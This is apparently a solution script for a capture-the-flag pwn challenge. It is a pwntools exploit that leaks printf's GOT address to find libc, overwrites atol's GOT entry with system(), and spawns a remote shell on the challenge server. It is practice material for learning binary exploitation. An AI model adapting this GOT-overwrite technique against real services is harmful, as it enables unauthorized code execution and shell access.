#wget https://ctf.j0n9hyun.xyz/files/2092b8a13989b6a10550783e354d0368/register

from pwn import *
import time
import sys

def syscall(p, syscall_num, args):
	rax = str(syscall_num)
	rdi = str(args[0])
	rsi = str(args[1])
	rdx = str(args[2])
	rcx = str(0)
	r8 = str(0)
	r9 = str(0)

	p.sendafter('RAX: ', rax)
	p.sendafter('RDI: ', rdi)
	p.sendafter('RSI: ', rsi)
	p.sendafter('RDX: ', rdx)
	p.sendafter('RCX: ', rcx)
	p.sendafter('R8: ', r8)
	p.sendafter('R9: ', r9)


p = remote("ctf.j0n9hyun.xyz",3026)
#p = process("./register")
e = ELF('./register')

input('attach gdb')

sys_read = 0x0
sys_write = 0x1
sys_open = 0x2
printf_offset = 0x043800	# for remote
#printf_offset = 0x3fe10	# for local
#system_offset = 0xfa00 # for local (printf-system)
system_offset = 0x10470	# for remote (printf-system)

syscall(p, sys_write, [1, e.got['printf'], 8])
printf_addr = unpack(p.recv(8), 'all', endian='little')
libc_base = printf_addr - printf_offset
#system_addr = libc_base + system_offset
system_addr = printf_addr - system_offset	# for local

print('printf addr: ', hex(printf_addr))
print('libc base  : ', hex(libc_base))
print('system addr: ', hex(system_addr))

syscall(p, sys_read, [0, e.got['atol'], 8])	# input system addr
p.sendline(p64(system_addr))
time.sleep(0.2)
p.sendline(b'/bin/sh\x00')
time.sleep(0.2)

p.interactive()
